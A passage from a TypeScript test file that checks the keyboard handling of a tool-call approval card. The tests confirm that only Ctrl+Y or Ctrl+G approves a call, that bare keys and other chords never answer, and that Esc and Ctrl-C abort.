    const card = answerable();
    const opened = press(card, 'r', CTRL);
    expect(opened.kind).toBe('state');
    expect(opened.kind === 'state' && opened.state.denial).toBe('');
    // On the full view a bare `r` reveals masked text and a chord is not a reveal: no state change at all.
    const onFull = answerable(small(), { screen: 'full' });
    expect(press(onFull, 'r', CTRL)).toEqual({ kind: 'none' });
  });

  it('a bare letter answers nothing — not y, g, n, r, a, c, a digit, upper-case — on a visible, inspected card', () => {
    const card = answerable();
    for (const input of ['y', 'g', 'n', 'r', 'a', 'c', '1', '2', '3', 'Y', 'A', 'N'])
      expect(press(card, input, {}), input).toEqual({ kind: 'none' });
  });

  it('every bare printable ASCII character is `none` on the card, except `v`, which opens the full view', () => {
    const card = answerable();
    // Space (0x20) to `~` (0x7e): all of them, inspected and visible, with every answer unlocked. A `y` that approved, an
    // `n` that denied, a `c` that opened the reason box, a `/` that opened a search would each fail here.
    const result = new Map<string, string>();
    for (let code = 0x20; code < 0x7f; code++) {
      const input = String.fromCharCode(code);
      const action = press(card, input, {});
      result.set(input, action.kind);
      if (input === 'v') {
        expect(action).toMatchObject({ kind: 'state', state: { screen: 'full' } });
      } else {
        expect(action, JSON.stringify(input)).toEqual({ kind: 'none' });
      }
    }
    expect(result.get('v')).toBe('state');
    expect([...result.entries()].filter(([, kind]) => kind !== 'none')).toEqual([['v', 'state']]);
  });

  it('every bare printable ASCII character is `none` on the full view too, apart from its inspection keys', () => {
    // The full view keeps its own bare navigation/inspection keys (reveal, numeric, search, copy, back); none of them is an
    // answer. What must never come out of ANY bare character is an `approve`, a `deny` or a reason box.
    const full = answerable(small(), { screen: 'full' });
    for (let code = 0x20; code < 0x7f; code++) {
      const input = String.fromCharCode(code);
      const action = press(full, input, {});
      expect(['approve', 'deny'], JSON.stringify(input)).not.toContain(action.kind);
      if (action.kind === 'state')
        expect(action.state.denial, JSON.stringify(input)).toBeUndefined();
    }
  });

  it('a chord is not an answer where something else owns the keyboard: the reason box, the search box, the call list, a details view', () => {
    const chords = ['y', 'g', 'n', 'r'];
    const owned: ReadonlyArray<readonly [string, ReturnType<typeof answerable>]> = [
      ['the reason box', answerable(small(), { denial: '' })],
      ['the reason box with text', answerable(small(), { denial: 'because' })],
      ['the search box', answerable(small(), { screen: 'full', searching: true, query: 'f' })],
      ['the call list', answerable(small(), { screen: 'list' })],
      [
        'a details view',
        {
          ...answerable(),
          state: { ...answerable().state, kind: 'details' as const },
        },
      ],
    ];
    for (const [name, review] of owned)
      for (const input of chords)
        for (const visible of [true, false])
          expect(press(review, input, CTRL, { visible }), `${name}: ctrl+${input}`).toEqual({
            kind: 'none',
          });
  });

  it('Ctrl+Alt (meta) never answers: Ctrl+Meta+Y/G/N/R and Alt+Y/G/N/R are all `none`', () => {
    const card = answerable();
    for (const input of ['y', 'g', 'n', 'r']) {
      expect(press(card, input, { ctrl: true, meta: true }), `ctrl+meta+${input}`).toEqual({
        kind: 'none',
      });
      expect(press(card, input, { meta: true }), `meta+${input}`).toEqual({ kind: 'none' });
    }
  });

  it('a Ctrl chord that is not an answer (Ctrl+A/E/S/T/W/Z) does nothing', () => {
    const card = answerable();
    for (const input of ['a', 'e', 's', 't', 'w', 'z'])
      expect(press(card, input, CTRL), `ctrl+${input}`).toEqual({ kind: 'none' });
  });

  it('Esc and Ctrl-C stop the turn — they are not answers, and they win over every other rule', () => {
    const card = answerable();
    expect(press(card, '', { escape: true })).toEqual({ kind: 'abort' });
    expect(press(card, 'c', CTRL)).toEqual({ kind: 'abort' });
    expect(press(answerable(small(), { denial: 'x' }), '', { escape: true })).toEqual({
      kind: 'abort',
    });
  });
});

describe('isAffirmativeReviewKey — only the Ctrl+Y / Ctrl+G chords are affirmative; a bare letter is a foreign key', () => {
  const card = () =>
    initialToolReview(
      'approval',
      'call',
      createReviewDocument(editedFilePreview(8, { 4: 'four' })),
    );

  it('is true for Ctrl+Y and Ctrl+G on an approval card or full view', () => {
    for (const state of [card(), { ...card(), screen: 'full' as const }]) {
      expect(isAffirmativeReviewKey(state, 'y', CTRL)).toBe(true);
      expect(isAffirmativeReviewKey(state, 'g', CTRL)).toBe(true);
    }
  });

  it('is false for a bare letter or digit, a Ctrl+Alt chord, and the non-affirmative chords (Ctrl+N, Ctrl+R)', () => {
    for (const input of ['y', 'a', 'g', 'n', 'r', 'c', '1', '2', '3', 'Y'])
      expect(isAffirmativeReviewKey(card(), input, {}), input).toBe(false);
    expect(isAffirmativeReviewKey(card(), 'y', { ctrl: true, meta: true })).toBe(false);
    expect(isAffirmativeReviewKey(card(), 'g', { ctrl: true, meta: true })).toBe(false);
    expect(isAffirmativeReviewKey(card(), 'n', CTRL)).toBe(false);
    expect(isAffirmativeReviewKey(card(), 'r', CTRL)).toBe(false);
  });

  it('is false wherever a text field, the call list or a details view owns the keyboard', () => {
    const state = card();
    for (const owned of [
      { ...state, denial: '' },
      { ...state, screen: 'full' as const, searching: true, query: '' },
      { ...state, screen: 'list' as const },
      { ...state, kind: 'details' as const },
    ])
      for (const input of ['y', 'g'])
        expect(isAffirmativeReviewKey(owned, input, CTRL)).toBe(false);
  });
});
